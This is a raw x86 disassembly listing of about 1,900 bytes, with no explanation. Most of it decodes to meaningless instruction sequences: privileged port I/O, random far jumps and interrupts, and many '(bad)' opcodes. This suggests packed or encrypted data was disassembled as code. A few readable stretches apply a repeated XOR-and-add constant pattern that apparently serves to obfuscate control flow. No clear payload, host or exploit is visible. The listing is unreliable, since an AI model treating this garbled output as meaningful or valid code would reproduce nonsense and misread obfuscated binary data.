  40c3bf:	outs   dx,BYTE PTR ds:[esi]
  40c3c0:	js     0x40c422
  40c3c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3c3:	popa   
  40c3c4:	jp     0x40c3ad
  40c3c6:	push   ebp
  40c3c7:	ret    0x9a42
  40c3ca:	pop    eax
  40c3cb:	sub    al,0xff
  40c3cd:	fnstcw WORD PTR [esi+edx*2-0x12]
  40c3d1:	inc    edx
  40c3d2:	js     0x40c37b
  40c3d4:	mov    edx,0x40d249c0
  40c3d9:	add    eax,0xbb6a7b20
  40c3de:	dec    esp
  40c3df:	xor    ecx,DWORD PTR [edi+0x4c10b8ca]
  40c3e5:	mov    ds:0xfc458b37,eax
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    DWORD PTR [esi-0x43],cl
  40c448:	mov    gs,WORD PTR [esp+edx*1]
  40c44b:	cmp    BYTE PTR [esi+0x7e],0x38
  40c44f:	jl     0x40c4cf
  40c451:	jle    0x40c474
  40c453:	jae    0x40c482
  40c455:	popa   
  40c456:	std    
  40c457:	dec    ch
  40c459:	push   ss
  40c45a:	in     eax,0xe1
  40c45c:	xchg   edi,eax
  40c45d:	pop    esi
  40c45e:	fimul  WORD PTR [ecx+0x36]
  40c461:	pop    esi
  40c462:	mov    al,ds:0x3c3f1ca0
  40c467:	leave  
  40c468:	cld    
  40c469:	mov    ds:0x4b5ee967,al
  40c46e:	in     eax,dx
  40c46f:	or     ebx,DWORD PTR [ebx+0xac698f4]
  40c475:	sahf   
  40c476:	sbb    ecx,DWORD PTR [ecx+eiz*8-0x1c]
  40c47a:	popf   
  40c47b:	mov    cl,0xd9
  40c47d:	ret    
  40c47e:	dec    BYTE PTR [edx+eax*8-0x21e7348b]
  40c485:	jmp    0x77ea:0xaa572ffb
  40c48c:	call   0x2de5:0xf87af050
  40c493:	sub    DWORD PTR [esi],esp
  40c495:	call   edx
  40c497:	sub    eax,0xefb4d8a4
  40c49c:	or     edx,eax
  40c49e:	inc    esi
  40c49f:	fucom  st(3)
  40c4a1:	mov    esp,0x1bb9eaea
  40c4a6:	and    bh,BYTE PTR [eax+0x3b363289]
  40c4ac:	rcl    BYTE PTR [ebx-0x1a],0xc0
  40c4b0:	dec    DWORD PTR [eax+0x7980f5ea]
  40c4b6:	mov    bh,0x7c
  40c4b8:	pop    eax
  40c4b9:	inc    ecx
  40c4ba:	out    dx,al
  40c4bb:	jno    0x40c4ae
  40c4bd:	cmp    eax,0x7b6f7c51
  40c4c2:	jl     0x40c4b9
  40c4c4:	call   0x531666bf
  40c4c9:	ds push cs
  40c4cb:	adc    eax,0x4162bda2
  40c4d0:	sti    
  40c4d1:	int    0xb9
  40c4d3:	mul    DWORD PTR [eax+0x3c79d7ad]
  40c4d9:	jge    0x40c50b
  40c4db:	scas   eax,DWORD PTR es:[edi]
  40c4dc:	mov    ch,0x7a
  40c4de:	das    
  40c4df:	(bad)  
  40c4e0:	out    dx,al
  40c4e1:	sbb    DWORD PTR [edi+0x28],0xf0f92faa
  40c4e8:	ins    BYTE PTR es:[edi],dx
  40c4e9:	cmp    al,0xb9
  40c4eb:	dec    edx
  40c4ec:	and    dl,bl
  40c4ee:	mov    edi,0x9c88cf83
  40c4f3:	cmc    
  40c4f4:	stos   DWORD PTR es:[edi],eax
  40c4f5:	scas   eax,DWORD PTR es:[edi]
  40c4f6:	xchg   ebp,eax
  40c4f7:	or     al,0xfb
  40c4f9:	sub    DWORD PTR [eax-0x4a7d9802],ebp
  40c4ff:	ss mov ebx,0x915a77c
  40c505:	or     al,0xa9
  40c507:	jb     0x40c530
  40c509:	loope  0x40c4c2
  40c50b:	mov    ds:0xad950f5,al
  40c510:	pop    edx
  40c511:	adc    ch,BYTE PTR ds:0xf26f27a9
  40c517:	fild   WORD PTR [esi+0x6d]
  40c51a:	ret    0x7518
  40c51d:	jl     0x40c53c
  40c51f:	jne    0x40c515
  40c521:	ja     0x40c4e3
  40c523:	div    esp
  40c525:	fisubr WORD PTR [esi-0x4753eb6c]
  40c52b:	ins    DWORD PTR es:[edi],dx
  40c52c:	loopne 0x40c57b
  40c52e:	xor    edi,edx
  40c530:	popf   
  40c531:	xchg   ecx,eax
  40c532:	je     0x40c508
  40c534:	cmp    DWORD PTR [esi-0x52],esp
  40c537:	add    edx,DWORD PTR [esi+ebx*2-0x464389b9]
  40c53e:	fsub   st(0),st
  40c540:	jp     0x40c581
  40c542:	sub    eax,0xcc5ff678
  40c547:	mov    dh,0xd3
  40c549:	aam    0x13
  40c54b:	shl    BYTE PTR [eax],1
  40c54d:	lahf   
  40c54e:	jnp    0x40c50f
  40c550:	inc    esi
  40c551:	sub    BYTE PTR [eax-0x10eccfd2],bh
  40c557:	stos   BYTE PTR es:[edi],al
  40c558:	psllq  mm3,QWORD PTR [eax+ebx*2-0x264ac4e7]
  40c560:	mov    al,0x61
  40c562:	fmulp  st(1),st
  40c564:	pop    esp
  40c565:	mov    edx,0xa2a3a63d
  40c56a:	imul   esi,esi,0x914f1ab
  40c570:	les    edi,FWORD PTR [edx-0xd]
  40c573:	mov    BYTE PTR [esi],dl
  40c575:	scas   eax,DWORD PTR es:[edi]
  40c576:	neg    BYTE PTR [esi+0x655cff3c]
  40c57c:	jo     0x40c547
  40c57e:	dec    ebx
  40c57f:	sub    bh,BYTE PTR [eax+0x620d67ff]
  40c585:	xor    ecx,DWORD PTR [edi]
  40c587:	pushf  
  40c588:	cmc    
  40c589:	mov    BYTE PTR [eax],0xe3
  40c58c:	xchg   ecx,eax
  40c58d:	pop    ss
  40c58e:	cld    
  40c58f:	popa   
  40c590:	xor    eax,0x752b8968
  40c595:	imul   edi,DWORD PTR [eax],0x31
  40c598:	sub    al,0x32
  40c59a:	test   BYTE PTR [ebp-0x48],al
  40c59d:	jmp    0x40c583
  40c59f:	imul   ebp,DWORD PTR [edx-0x1d],0x57a42120
  40c5a6:	sub    eax,0x163190a4
  40c5ab:	and    al,0x33
  40c5ad:	push   ds
  40c5ae:	mov    ecx,DWORD PTR [ebp+0x28]
  40c5b1:	jge    0x40c548
  40c5b3:	mul    BYTE PTR [ebp+eiz*2+0x35]
  40c5b7:	(bad)  
  40c5b8:	idiv   esp
  40c5ba:	sbb    ecx,0xffffffe2
  40c5bd:	fstp   DWORD PTR [edi]
  40c5bf:	pop    ebx
  40c5c0:	mov    bh,0x8e
  40c5c2:	in     al,dx
  40c5c3:	out    dx,al
  40c5c4:	dec    esi
  40c5c5:	rcl    BYTE PTR [ebp+0x5fabdd2e],cl
  40c5cb:	mov    eax,ds:0xd32c5c7f
  40c5d0:	push   es
  40c5d1:	push   eax
  40c5d2:	test   DWORD PTR [ebp+0x20b0244f],ebp
  40c5d8:	mov    dh,0xa7
  40c5da:	int    0x52
  40c5dc:	sub    eax,0xb1865f2e
  40c5e1:	nop
  40c5e2:	push   esi
  40c5e3:	iret   
  40c5e4:	fisttp WORD PTR [ebx+0x56eb13af]
  40c5ea:	retf   
  40c5eb:	dec    edx
  40c5ec:	mov    al,ds:0xc87cd751
  40c5f1:	(bad)
  40c5f5:	test   eax,0x9c99bcfe
  40c5fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5fb:	jmp    0x40c5db
  40c5fd:	cmp    BYTE PTR [ebp+0x10],cl
  40c600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c601:	pop    ss
  40c602:	mul    DWORD PTR ds:0x8dc05c94
  40c608:	ret    
  40c609:	sub    BYTE PTR [ebp+0xcc2cfb7],dh
  40c60f:	ins    DWORD PTR es:[edi],dx
  40c610:	in     al,0x51
  40c612:	add    ecx,ebp
  40c614:	pop    ss
  40c615:	aaa    
  40c616:	adc    dh,BYTE PTR [edi-0x4]
  40c619:	sti    
  40c61a:	loopne 0x40c65d
  40c61c:	out    0xdd,eax
  40c61e:	inc    esi
  40c61f:	mov    bl,0x23
  40c621:	mov    ebp,0x1cebec5e
  40c626:	fnsave [esi+0x17]
  40c629:	ss (bad) 
  40c62b:	jns    0x40c6ac
  40c62d:	movs   BYTE PTR es:[di],BYTE PTR es:[si]
  40c630:	xor    esp,0xffffff8c
  40c633:	push   eax
  40c634:	(bad)  
  40c635:	(bad)  
  40c636:	pop    edi
  40c637:	popa   
  40c638:	mov    ah,0xb5
  40c63a:	paddusb mm1,QWORD PTR [ebx-0x55]
  40c63e:	push   ecx
  40c63f:	inc    eax
  40c640:	clc    
  40c641:	es pusha 
  40c643:	cwde   
  40c644:	addr16 aad 0xe1
  40c647:	cmp    eax,0xb77606a4
  40c64c:	mov    al,ds:0xfa386e48
  40c651:	rcr    ecx,cl
  40c653:	jecxz  0x40c61d
  40c655:	data16 shr BYTE PTR [eax+0x75],0xaf
  40c65a:	jmp    0x40c68c
  40c65c:	(bad)  
  40c65d:	mul    DWORD PTR [eax-0xb18204c]
  40c663:	xor    DWORD PTR [ecx+0x457d5442],edi
  40c669:	or     edi,ebx
  40c66b:	outs   dx,DWORD PTR ds:[esi]
  40c66c:	lods   al,BYTE PTR ds:[esi]
  40c66d:	loope  0x40c6b7
  40c66f:	cmp    bl,BYTE PTR [edi+0x57]
  40c672:	mov    edx,0xc02241ae
  40c677:	not    DWORD PTR [edi-0x4dbae3b7]
  40c67d:	imul   ecx,eax,0xc2b79fe
  40c683:	test   BYTE PTR [esi+edi*1-0x2b074966],cl
  40c68a:	cmc    
  40c68b:	adc    al,0xb8
  40c68d:	mov    BYTE PTR [edx],ah
  40c68f:	jg     0x40c67e
  40c691:	or     esp,0x10397e3a
  40c697:	mov    ah,0xbe
  40c699:	fwait
  40c69a:	jb     0x40c6ce
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x79539ac1],dl
  40c6de:	xchg   edx,eax
  40c6df:	arpl   si,bx
  40c6e1:	cmp    BYTE PTR [esi+0x7e],0x38
  40c6e5:	jl     0x40c765
  40c6e7:	jle    0x40c69f
  40c6e9:	(bad)  
  40c6ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6eb:	mov    ah,0x90
  40c6ed:	push   ebp
  40c6ee:	mov    al,ds:0x2b9aec88
  40c6f3:	out    0x8f,eax
  40c6f5:	cmp    bh,dl
  40c6f7:	jne    0x40c700
  40c6f9:	lahf   
  40c6fa:	push   ds
  40c6fb:	cmp    ebx,DWORD PTR [eax]
  40c6fd:	nop
  40c6fe:	jle    0x40c6c4
  40c700:	push   ds
  40c701:	xlat   BYTE PTR ds:[ebx]
  40c702:	test   BYTE PTR [ebp+0x4771e248],0xcd
  40c709:	xor    dh,BYTE PTR [ecx-0x4e]
  40c70c:	into   
  40c70d:	fld    QWORD PTR [edi-0xf]
  40c710:	fdivrp st(5),st
  40c712:	enter  0xf95f,0x88
  40c716:	mov    dh,0xb4
  40c718:	sti    
  40c719:	cli    
  40c71a:	div    BYTE PTR [ecx]
  40c71c:	lock nop
  40c71e:	aaa    
  40c71f:	icebp  
  40c720:	cmc    
  40c721:	mov    ecx,0x84809afa
  40c726:	mov    BYTE PTR [edx+0x7a],dl
  40c729:	or     eax,0xd8bd7aa
  40c72e:	sub    ebx,DWORD PTR [esi]
  40c730:	sar    DWORD PTR [eax-0x16177fd5],0x13
  40c737:	(bad)  
  40c738:	jbe    0x40c790
  40c73a:	xor    eax,0x9df6de2c
  40c73f:	jnp    0x40c77e
  40c741:	outs   dx,BYTE PTR ds:[esi]
  40c742:	jns    0x40c784
  40c744:	ins    DWORD PTR es:[edi],dx
  40c745:	inc    esi
  40c746:	cmp    eax,0x8c99c77
  40c74b:	lahf   
  40c74c:	add    ebx,DWORD PTR [ebp+0x3a]
  40c74f:	or     al,BYTE PTR [edx]
  40c751:	or     eax,0x62f3891b
  40c756:	ret    0xd4cc
  40c759:	or     DWORD PTR [ebp-0x48],esi
  40c75c:	call   0xab8b:0x7ea0949c
  40c763:	mov    edi,DWORD PTR ds:[eax+0x34]
  40c767:	pusha  
  40c768:	jns    0x40c7e9
  40c76a:	das    
  40c76b:	dec    ebp
  40c76c:	xchg   ecx,eax
  40c76d:	les    esp,FWORD PTR [esp+edx*8+0x34e9a244]
  40c774:	mov    esi,0x41a27043
  40c779:	rcl    BYTE PTR [edx],1
  40c77b:	aam    0xa
  40c77d:	sar    DWORD PTR [ebp+0x76],cl
  40c780:	fist   WORD PTR [ebx+0xbc07ab0]
  40c786:	jne    0x40c7c1
  40c788:	mov    ds:0x2c7cb5ce,eax
  40c78d:	int    0x95
  40c78f:	or     al,0xb1
  40c791:	rol    BYTE PTR [ecx+ebx*1+0x1c176c6f],cl
  40c798:	sub    bh,BYTE PTR [edi+eax*2]
  40c79b:	mov    ss:0xfc5b937,al
  40c7a1:	push   eax
  40c7a2:	aas    
  40c7a3:	mov    esi,ecx
  40c7a5:	xor    BYTE PTR [edi],dh
  40c7a7:	rcr    BYTE PTR [ebx-0x42],1
  40c7aa:	ins    DWORD PTR es:[edi],dx
  40c7ab:	in     al,0x95
  40c7ad:	add    DWORD PTR [eax+edi*2],edx
  40c7b0:	mov    dh,0x55
  40c7b2:	pop    esp
  40c7b3:	shl    DWORD PTR [edx-0x1c],cl
  40c7b6:	adc    eax,0xb53080af
  40c7bb:	repnz push ebp
  40c7bd:	mov    BYTE PTR ds:0x38d7006,al
  40c7c3:	push   es
  40c7c4:	lock or DWORD PTR [esp+ecx*4],ebx
  40c7c8:	je     0x40c74d
  40c7ca:	xor    DWORD PTR [ecx],0x6b38421d
  40c7d0:	mov    BYTE PTR ds:0x5e4bd774,ch
  40c7d6:	leave  
  40c7d7:	icebp  
  40c7d8:	dec    sp
  40c7da:	jecxz  0x40c76a
  40c7dc:	aas    
  40c7dd:	fld    QWORD PTR ds:0x978a4f4c
  40c7e3:	jg     0x40c77f
  40c7e5:	add    al,0x1f
  40c7e7:	adc    bl,BYTE PTR [edx]
  40c7e9:	xchg   ebp,eax
  40c7ea:	rcr    DWORD PTR [ecx-0x3f],0x2a
  40c7ee:	rol    ah,cl
  40c7f0:	test   bh,0x41
  40c7f3:	mov    bh,0x68
  40c7f5:	sub    DWORD PTR [ebx],ecx
  40c7f7:	je     0x40c82d
  40c7f9:	(bad)  [ebp+0x73]
  40c7fc:	retf   0x7c2
  40c7ff:	adc    al,0x42
  40c801:	fsubp  st(0),st
  40c803:	out    dx,al
  40c804:	push   edx
  40c805:	repz sbb eax,0x203c3bce
  40c80b:	jnp    0x40c7d2
  40c80d:	lods   al,BYTE PTR ds:[esi]
  40c80e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c80f:	cmp    ecx,esp
  40c811:	aam    0x44
  40c813:	or     DWORD PTR [ecx-0x5d],ecx
  40c816:	xchg   ebx,eax
  40c817:	cmp    bh,BYTE PTR ds:0x4ff02799
  40c81d:	sbb    DWORD PTR [ebp-0x3fbf70d9],ecx
  40c823:	pop    ebx
  40c824:	jbe    0x40c83d
  40c826:	fwait
  40c827:	push   esi
  40c828:	sub    eax,0x1aca87f2
  40c82d:	test   ah,bl
  40c82f:	mov    ah,0x96
  40c831:	in     eax,0xce
  40c833:	(bad)
  40c836:	cmp    eax,0x58b2f0da
  40c83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c83c:	in     al,0x8e
  40c83e:	sub    al,0xd2
  40c840:	and    eax,0x9e8b6c29
  40c845:	sub    dl,BYTE PTR [ebx+0x69]
  40c848:	cmp    al,0xb7
  40c84a:	cmp    al,0x13
  40c84c:	out    0xde,al
  40c84e:	ds repz shl ah,0xab
  40c853:	nop
  40c854:	push   eax
  40c855:	sub    DWORD PTR [esi-0x57],edx
  40c858:	xchg   esi,ebx
  40c85a:	cmp    al,0x68
  40c85c:	stos   BYTE PTR es:[edi],al
  40c85d:	jnp    0x40c863
  40c85f:	psubusw mm2,QWORD PTR [ecx-0x7d]
  40c863:	pop    ebp
  40c864:	jecxz  0x40c82e
  40c866:	xor    ah,cl
  40c868:	lods   al,BYTE PTR ds:[esi]
  40c869:	lock iret 
  40c86b:	repnz daa 
  40c86d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c86e:	fbld   TBYTE PTR [ecx+ebp*8+0x5c]
  40c872:	cmp    DWORD PTR [eax+0x36],edx
  40c875:	call   0xc8272e0e
  40c87a:	add    BYTE PTR [esi+0x3b],al
  40c87d:	cmp    DWORD PTR [edx],ebp
  40c87f:	cmp    ecx,ebx
  40c881:	repnz xchg esi,eax
  40c883:	push   0xbed33054
  40c888:	and    DWORD PTR [esi+0x78],edx
  40c88b:	(bad)  
  40c88c:	or     eax,0x7a80ed85
  40c891:	(bad)  
  40c892:	mov    bh,0xb8
  40c894:	add    al,0x6a
  40c896:	daa    
  40c897:	inc    edi
  40c898:	jb     0x40c910
  40c89a:	popa   
  40c89b:	dec    edx
  40c89c:	mov    al,ds:0x16f13e55
  40c8a1:	and    al,0x7b
  40c8a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8a4:	dec    ebx
  40c8a5:	out    dx,al
  40c8a6:	int3   
  40c8a7:	inc    esp
  40c8a8:	out    dx,al
  40c8a9:	nop
  40c8aa:	fadd   DWORD PTR fs:[eax]
  40c8ad:	sub    ch,BYTE PTR [ecx+0x2a95dc7a]
  40c8b3:	fcomp  DWORD PTR [ecx+0x18e710ee]
  40c8b9:	outs   dx,BYTE PTR ds:[esi]
  40c8ba:	sahf   
  40c8bb:	adc    BYTE PTR [ecx-0x7ae28057],ch
  40c8c1:	jno    0x40c91e
  40c8c3:	aas    
  40c8c4:	mov    edx,0x19236b01
  40c8c9:	push   ds
  40c8ca:	dec    ebp
  40c8cb:	sub    eax,0x6173bc35
  40c8d0:	into   
  40c8d1:	sub    DWORD PTR [eax],esp
  40c8d3:	push   esi
  40c8d4:	dec    esi
  40c8d5:	mov    dh,0x80
  40c8d7:	outs   dx,BYTE PTR ds:[esi]
  40c8d8:	sub    al,0xe4
  40c8da:	lods   al,BYTE PTR ds:[esi]
  40c8db:	xchg   esi,eax
  40c8dc:	pop    ds
  40c8dd:	and    esi,DWORD PTR ds:0x7d46ab64
  40c8e3:	imul   eax,DWORD PTR [eax+ecx*2+0x589b961],0xffffffdf
  40c8eb:	shl    BYTE PTR [eax-0xaf44dbb],1
  40c8f1:	lods   al,BYTE PTR ds:[esi]
  40c8f2:	nop
  40c8f3:	pushf  
  40c8f4:	repz push ebp
  40c8f6:	out    dx,eax
  40c8f7:	inc    eax
  40c8f8:	inc    edx
  40c8f9:	pop    esi
  40c8fa:	pop    esp
  40c8fb:	ds sbb eax,0x22824a1f
  40c901:	fstp   TBYTE PTR [edx]
  40c903:	out    0x51,eax
  40c905:	or     al,0xb
  40c907:	xor    al,0x6f
  40c909:	in     eax,0x4d
  40c90b:	(bad)  [ecx+0x46fce065]
  40c911:	mov    ebx,0x6578bedb
  40c916:	int    0x73
  40c918:	je     0x40c91e
  40c91a:	ja     0x40c8d8
  40c91c:	rol    edx,0x3f
  40c91f:	mov    esp,0xe6c22794
  40c924:	test   eax,0x5c1b2a5b
  40c929:	pushf  
  40c92a:	mov    ecx,0x8bd74d44
  40c92f:	push   ebp
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [ebp+0x7b],esi
  40c946:	mov    esi,0x7e8e98f1
  40c94b:	jle    0x40c985
  40c94d:	jl     0x40c9cd
  40c94f:	jle    0x40c958
  40c951:	or     al,0x79
  40c953:	push   0xe5d16224
  40c958:	ins    DWORD PTR es:[edi],dx
  40c959:	repnz dec esp
  40c95b:	push   edi
  40c95c:	loop   0x40c8f6
  40c95e:	dec    edi
  40c95f:	adc    esi,0x882ecb87
  40c965:	mov    ecx,0xe67d7af8
  40c96a:	xchg   ecx,eax
  40c96b:	syscall 
  40c96d:	add    cl,BYTE PTR [ecx-0xd8939ca]
  40c973:	mov    dl,0x29
  40c975:	les    edx,FWORD PTR ds:0xa2a0686d
  40c97b:	call   0x61817995
  40c980:	bswap  edi
  40c982:	das    
  40c983:	retf   0x41cc
  40c986:	and    DWORD PTR [ecx+0x718ed603],ecx
  40c98c:	sub    al,BYTE PTR [esi+0x5e248442]
  40c992:	sub    BYTE PTR gs:[ebp+0x879e],dl
  40c999:	shl    bh,cl
  40c99b:	pop    ss
  40c99c:	mov    ch,0x47
  40c99e:	jmp    0x5c9b:0x340c4e06
  40c9a5:	or     DWORD PTR [ebp-0x5aaaf2de],edi
  40c9ab:	xor    bl,ah
  40c9ad:	push   edx
  40c9ae:	js     0x40c97d
  40c9b0:	pop    esi
  40c9b1:	int    0x6d
  40c9b3:	(bad)  
  40c9b5:	mov    eax,0x17141a60
  40c9ba:	aam    0xab
  40c9bc:	ffreep st(0)
  40c9be:	inc    ebp
  40c9bf:	sbb    BYTE PTR [ebp+0x714b03e3],bh
  40c9c5:	shr    bh,1
  40c9c7:	sbb    eax,0x94877a1
  40c9cc:	add    bl,BYTE PTR ds:0x4dc2525d
  40c9d2:	in     eax,dx
  40c9d3:	and    BYTE PTR [esi],ch
  40c9d5:	mov    esp,0x5ca144c3
  40c9da:	mov    dl,0x3
  40c9dc:	cmc    
  40c9dd:	pop    edi
  40c9de:	rol    DWORD PTR [edi-0x3],1
  40c9e1:	pop    edi
  40c9e2:	xor    DWORD PTR [edx-0x1cc36dd1],ebp
  40c9e8:	pop    ebx
  40c9e9:	out    dx,eax
  40c9ea:	(bad)  
  40c9eb:	popa   
  40c9ec:	retf   
  40c9ed:	imul   esi,DWORD PTR [edi-0x1f],0x494e75f6
  40c9f4:	xchg   edi,eax
  40c9f5:	or     esi,DWORD PTR [edx+0xe]
  40c9f8:	push   ebx
  40c9f9:	stos   BYTE PTR es:[edi],al
  40c9fa:	pop    es
  40c9fb:	sbb    eax,DWORD PTR [edx+0x7cd000c0]
  40ca01:	adc    eax,0x5362306e
  40ca06:	sti    
  40ca07:	adc    al,0xaf
  40ca09:	stc    
  40ca0a:	aas    
  40ca0b:	jnp    0x40ca2b
  40ca0d:	sahf   
  40ca0e:	sbb    al,0x90
  40ca10:	aam    0x15
  40ca12:	add    edi,DWORD PTR [eax-0x1e16206f]
  40ca18:	mov    dh,0xad
  40ca1a:	push   edx
  40ca1b:	dec    ecx
  40ca1c:	loope  0x40ca72
  40ca1e:	enter  0xaeb1,0x85
  40ca22:	nop
  40ca23:	or     BYTE PTR [edi-0x1c9b509f],0x10
  40ca2a:	call   0x8aa2:0x1f2d78a6
  40ca31:	(bad)  
  40ca32:	cdq    
  40ca33:	jne    0x40caa9
  40ca35:	into   
  40ca36:	sub    eax,0x5bfa5732
  40ca3b:	retf   
  40ca3c:	and    dl,ah
  40ca3e:	sub    BYTE PTR [edi],bh
  40ca40:	sub    DWORD PTR [edi+0xf],esp
  40ca43:	xchg   ecx,eax
  40ca44:	sbb    cl,BYTE PTR ss:[eax+0x76]
  40ca48:	rcl    edx,1
  40ca4a:	bound  edi,QWORD PTR [esi+ebp*2+0x48d59a88]
  40ca51:	mov    esp,0x788e635
  40ca56:	jbe    0x40ca57
  40ca58:	mov    esp,0x25b21177
  40ca5d:	call   DWORD PTR fs:[eax-0x4b0247b5]
  40ca64:	clc    
  40ca65:	stc    
  40ca66:	rcl    DWORD PTR [ebp*1+0xee2d481],0x68
  40ca6e:	pop    ebp
  40ca6f:	(bad)  
  40ca70:	xor    al,0x4e
  40ca72:	jnp    0x40ca4b
  40ca74:	adc    edi,DWORD PTR [ebp+0x4f257421]
  40ca7a:	iret   
  40ca7b:	nop
  40ca7c:	inc    esp
  40ca7d:	(bad)  
  40ca7f:	in     eax,0x5c
  40ca81:	daa    
  40ca82:	cli    
  40ca83:	mov    ds:0x1f5fd56a,al
  40ca88:	fidiv  WORD PTR [edx+eiz*4+0x38]
  40ca8c:	mov    ch,0xfb
  40ca8e:	int3   
  40ca8f:	sbb    al,0x4e
  40ca91:	or     DWORD PTR [edx+eiz*2],esp
  40ca94:	mov    edx,0xb68fe8b4
  40ca99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca9a:	mov    al,0xab
  40ca9c:	cdq    
  40ca9d:	loopne 0x40ca93
  40ca9f:	repz xor al,0x33
  40caa2:	dec    ebx
  40caa3:	cs ds int3 
  40caa6:	sub    al,0xf
  40caa8:	mul    DWORD PTR [edx+0x40]
  40caab:	dec    esp
  40caac:	jnp    0x40cb07
  40caae:	icebp  
  40caaf:	sti    
  40cab0:	pushf  
  40cab1:	xchg   ebx,eax
  40cab2:	leave  
  40cab3:	jmp    0x82c9:0xf0783e6
  40caba:	or     al,0xa2
  40cabc:	sub    eax,DWORD PTR [ebp+0xc]
  40cabf:	sub    DWORD PTR [ecx-0x4],0xffffffd4
  40cac3:	stos   BYTE PTR es:[edi],al
  40cac4:	mov    esi,DWORD PTR [edx+0x35]
  40cac7:	push   esi
  40cac8:	test   al,0x5c
  40caca:	dec    esp
  40cacb:	pop    ecx
  40cacd:	pop    edx
  40cace:	fbstp  TBYTE PTR [eax-0x11]
  40cad1:	ds jle 0x40ca81
  40cad4:	jb     0x40caaa
  40cad6:	pop    ecx
  40cad7:	out    dx,eax
  40cad8:	mov    dh,0x88
  40cada:	push   es
  40cadb:	js     0x40ca7a
  40cadd:	fcos   
  40cadf:	std    
  40cae0:	repnz loopne 0x40cb62
  40cae3:	int    0xc7
  40cae5:	dec    edi
  40cae6:	push   cs
  40cae7:	rcl    DWORD PTR [ecx-0xf07938e],cl
  40caed:	inc    edx
  40caee:	fs sbb al,0xf5
  40caf1:	jmp    0xe3d2:0x98563334
  40caf8:	stos   BYTE PTR es:[edi],al
  40caf9:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40cafb:	pop    ds
  40cafc:	aam    0x0
  40cafe:	xlat   BYTE PTR ds:[ebx]
  40caff:	pop    esi
  40cb00:	int    0x43
  40cb02:	es inc edi
  40cb04:	sub    esi,DWORD PTR [edx]
  40cb06:	aaa    
  40cb07:	pop    es
  40cb08:	dec    edx
  40cb09:	mov    bl,0x17
  40cb0b:	imul   ebp,esp,0x5a
  40cb0e:	mov    dl,0x76
  40cb10:	adc    cl,ah
  40cb12:	xchg   DWORD PTR [esi+0x3a],esi
  40cb15:	push   cs
  40cb16:	scas   al,BYTE PTR es:[edi]
  40cb17:	mov    edi,0x90009559
  40cb1c:	jg     0x40cac5
  40cb1e:	push   0xfa2e30f9
  40cb23:	push   es
  40cb24:	xchg   esp,eax
  40cb25:	aaa    
  40cb26:	cmp    al,0xa3
  40cb28:	gs dec ebx
  40cb2a:	fdivr  QWORD PTR [ecx-0xc91a370]
  40cb30:	mov    dl,0x25
  40cb32:	jge    0x40caef
  40cb34:	iret   
  40cb35:	fld    QWORD PTR [edx]
  40cb37:	loope  0x40cacf
  40cb39:	add    eax,0x30ddeb45
  40cb3e:	jle    0x40cb82
  40cb40:	cld    
  40cb41:	push   eax
  40cb42:	inc    ebx
  40cb43:	ss jns 0x40cb9d
  40cb46:	mov    ah,0x1a
  40cb48:	push   edi
  40cb49:	or     DWORD PTR [eax+0x7b471910],0x61
  40cb50:	aas    
  40cb51:	mov    bl,0x72
  40cb53:	inc    esp
  40cb54:	adc    bh,BYTE PTR [ecx-0x5e959bf3]
  40cb5a:	add    ecx,DWORD PTR [eax+0x21]
  40cb5d:	push   ds
  40cb5e:	ds mov ebp,0xdf0a3c0d
